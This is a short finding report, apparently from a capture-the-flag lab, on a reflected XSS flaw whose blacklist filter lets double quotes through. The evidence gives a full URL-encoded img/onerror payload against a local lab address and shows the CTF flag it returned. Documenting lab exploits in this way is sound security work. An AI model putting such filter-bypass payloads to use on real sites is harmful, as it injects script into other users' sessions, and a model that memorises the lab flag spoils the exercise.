findings.title: Reflected XSS - Filter Bypass via Double Quotes
findings.description: The /page endpoint reflects the 'name' GET parameter without sufficient sanitization. A blacklist filter blocks 'script' keywords and single quotes (') but does NOT block double quotes. By using double quotes in the alert payload, the XSS filter is bypassed. The injected payload executes in the context after the closing > of the input tag. CTF FLAG EXTRACTED.
findings.evidence: Payload: URL: http://172.17.0.1:34871/page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS%22%29%3E Response: Congratulations! Here is the flag: flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}

flowchart TD
